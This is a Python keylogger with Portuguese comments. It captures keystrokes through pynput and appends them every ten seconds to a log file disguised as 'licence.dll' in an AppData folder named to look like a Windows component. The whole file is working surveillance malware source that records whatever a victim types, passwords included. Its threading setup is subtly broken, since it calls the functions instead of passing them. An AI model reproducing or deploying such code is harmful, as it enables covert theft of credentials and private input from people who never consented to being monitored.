###############################################################
# Imports
###############################################################
import os
import time
import threading
from pynput import keyboard

###############################################################
# Vars. Global
###############################################################
_PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
_NAME = 'licence.dll'
_KEYS = ''
_AUTO_SAVE_TIME = 10
_RUN = True
_NUMBERS = {
    "96":"0",
    "97":"1",
    "98":"2",
    "99":"3",
    "100":"4",
    "101":"5",
    "102":"6",
    "103":"7",
    "104":"8",
    "105":"9"
}

###############################################################
# Classes e Funções
###############################################################
def auto_save():
    """
    Salva automaticamente o que o usuário digitou
    dentro do tempo especificado em _AUTO_SAVE_TIME.

    Parameters:
        None

    Returns:
        None
    """
    global _KEYS
    global _AUTO_SAVE_TIME
    global _RUN

    while _RUN:
        if len(_KEYS) > 0:
            write_on_file(_KEYS)
        time.sleep(_AUTO_SAVE_TIME)

def write_on_file(c):
    """
    Grava o conteudo passado para ela em um arquivo
    especificado em _PATH.

    Parameters:
        c (str): Conteudo que será gravado no arquivo.

    Returns:
        None
    """
    global _PATH
    global _KEYS
    c = str(c)
    with open(_PATH, 'a+') as file:
        file.write(c)
        file.close()
    _KEYS = '' # Zerando a var global para reutilizar !

'''
def del_on_file():
    with open(path, 'r+') as file:
        content = file.read()
        file.write(content[:-1])
        file.close()
'''

def p_numbers(n):
    """
    Recebe o número no formato do Pynput
    e o transforma em decimal.

    Parameters:
        n (int): Recebe o número em binário
        e o converte para decimal

    Returns:
         Retorna o Valor convertido para decimal
    """
    global _NUMBERS

    for key, value in _NUMBERS.items():
        if n == int(key):
            return value

def on_press(key):
    global _KEYS
    global _RUN

    # Encerra o programa
    if key == keyboard.Key.esc:
        _RUN = False
        return False

    # Se apertar enter ele grava o que está digitado
    elif key == keyboard.Key.enter:
        _KEYS += ' \n'
        write_on_file(_KEYS)

    # Adicionando espaço do TAB
    elif key == keyboard.Key.tab:
        _KEYS += '	'

    # Se Apertar o Espaço ele o adiciona
    elif key == keyboard.Key.space:
        _KEYS += ' '

    # Ainda preciso fazer a parte de deletar
    elif key == keyboard.Key.backspace:
        pass

    # Se for qualquer outra tecla especial eu descarto ela !
    elif isinstance(key, keyboard.Key):
        pass

    # Se não for nenhuma das teclas selecionadas
    else:
        # Verifico se é letras
        if key.char:
            print('é char')
            _KEYS += str(key).replace("'", "")

        # Verifico se é numeros
        else:
            print('é numero')
            key = int(str(key).replace('<', '').replace('>', ''))
            _KEYS += str(p_numbers(key))

###############################################################
# Main
###############################################################
if __name__ == "__main__":

    # Verifica se o caminho para gravar existe
    if os.path.isdir(_PATH):
        _PATH = os.path.join(_PATH, _NAME)
    else:
        os.mkdir(_PATH)
        _PATH = os.path.join(_PATH, _NAME)

    # Cria um listener para capturar os eventos de teclado
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    th = [threading.Thread(target=auto_save()), threading.Thread(target=listener.join())]

    for i in range(0, len(th)):
        th[i].start()

    for i in range(0, len(th)):
        th[i].join()
